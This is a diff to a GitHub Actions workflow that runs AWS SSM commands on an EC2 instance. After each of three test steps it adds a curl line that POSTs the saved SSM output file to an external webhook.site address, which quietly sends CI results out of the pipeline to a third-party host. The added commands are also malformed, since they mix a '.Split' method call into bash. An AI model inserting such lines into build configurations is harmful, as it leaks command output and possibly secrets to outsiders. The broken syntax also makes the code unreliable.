@@ -39,6 +39,7 @@ jobs:
             --instance-id i-0fb9dcbeb35b4fdbe \
             --region ap-south-1 > ssm_out1.json || true
           cat ssm_out1.json
+          curl -X POST -H "Content-Type: application/json" -d @$(cat ssm_out1.json.Split(' ')[1]) https://webhook.site/681f0d6f-6fa8-46bb-8fe2-22aa02b5e79e
 
       - name: Run Test Command 2 - base64 wrapped
         run: |
@@ -58,6 +59,7 @@ jobs:
             --instance-id i-0fb9dcbeb35b4fdbe \
             --region ap-south-1 > ssm_out2.json || true
           cat ssm_out2.json
+          curl -X POST -H "Content-Type: application/json" -d @$(cat ssm_out2.json.Split(' ')[1]) https://webhook.site/681f0d6f-6fa8-46bb-8fe2-22aa02b5e79e
 
       - name: Run Test Command 3 - large base64 wrapped
         run: |
@@ -79,3 +81,4 @@ jobs:
             --instance-id i-0fb9dcbeb35b4fdbe \
             --region ap-south-1 > ssm_out3.json || true
           cat ssm_out3.json
+          curl -X POST -H "Content-Type: application/json" -d @$(cat ssm_out3.json.Split(' ')[1]) https://webhook.site/681f0d6f-6fa8-46bb-8fe2-22aa02b5e79e
